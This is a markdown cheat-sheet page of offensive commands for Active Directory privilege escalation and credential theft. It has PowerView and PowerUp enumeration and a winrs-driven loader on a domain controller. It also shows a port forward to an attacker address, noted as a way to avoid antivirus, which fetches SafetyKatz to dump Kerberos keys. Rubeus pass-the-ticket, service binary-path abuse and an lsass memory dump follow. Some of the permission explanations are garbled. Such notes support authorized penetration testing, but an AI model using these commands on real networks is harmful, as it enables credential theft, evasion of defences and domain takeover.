---
layout: app
title: "Active Directory - PrivEsc"
tags: ["privesc","powerup","powerview","abuse service", "sc.exe", "Rubeus","permissions", "netloader","winrs","SafetyKats"]

---

# Privilege Escalation

## CheckList

- -**Missing Patches**
- -**Automated deployment**
- -**Autologon passwords**
- -**AlwaysInstallElevated**
- -**MisConfiguration Services**
- -**DLL Hijacking**
- -**NTLM Relaying**


### Tools
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* - Invoke-AllChecks
* [Privesc](https://github.com/enjoiz/Privesc)
* [RemotePotato0](https://github.com/antonioCoco/RemotePotato0)


# Extract Hashes or Credentials

Import PowerView.ps1
Use to find out opened sessions

```powershell
Find-DomainUserLocation
```

Download NetLoader.exe and copy to Domain Controller

```powershell
echo f | xcopy C:\users\public\loader.exe \\dc01\c$\Users\Public\loader.exe
```

Add port forward into Domain Controller using winrs, to prevent AV detect

```powershell
$null | winrs -r:dc01 "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=280 connectaddress=[attacket_address]"
```

Invoke Loader to run SafetyKats to get hashes and credentials

```powershell
$null | winrs -r:dc01 "c:\Users\Public\loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit"
```

With **aes256_hmac** can be use **Rubeus** to execute command

```powershell
Rubeus.exe asktgt /user:<username> /aes256:<aes256_hmac> /opsec /createnetonly:C:\windows\system32\cmd.exe /show /ptt
```

## PowerSploit

### Get Services with Unquoted Path

```powershell
Get-ServiceUnquoted -Verbose
Get-WmiObject -Class win32_service | select pathname
```
### Current User rights

Determine if the current user has rights to modify the service binary itself or any associated arguments

```powershell
Get-ModifiableServiceFile
```

### Get Service Security Permission
```powershell
sc.exe sdshow "servicename"
```
**--------------------OUTPUT----------------------------**

- **D**: Indicates that is a Security Policy
- **A**: Indicates than additional permits are granted.
- **CC**: Change Permissions
- **LCSW**: List Contents
- **RP**: Read Permission
- **WP**: Write Permission
- **DT**: Delete Toggles
- **LOCRRC**: Ocultar o revelar recursos
- **;;;** indicates that the permissions apply to the account **service**

### Abuse of service

```powershell
sc.exe config "servicename" binpath="newservicepath"
```


## Enumeration

### Find computers where a current user can execute commands

```powershell
Find-LocalAdminAccess
Find-WMILocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess.ps1 
Invoke-CheckLocalAdminAccess
```

### Get all domain computers

```powershell
Get-NetComputer
```
### Finds domain machines where specific users are logged into

```powershell
Test-AdminAccess
Find-DomainUserLocation -CheckAccess
Find-DomainUserLocation -Stealth
```
## Run all checks

### PowerUp


```powershell
Invoke-AllChecks
```

### Privesc

```powershell
Invoke-PrivEsc
Invoke-Privesc check
```

### PEASS-ng

```powershell
winPEASx64.exe
```

# Dump Memory

```powershell
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe c:\windows\system32\comsvcs.dll, MiniDump "Lsass Process ID" c:\temp\lsass.dmp full
```

## Tools 

* lsassy
* Physmem2profit
* impacket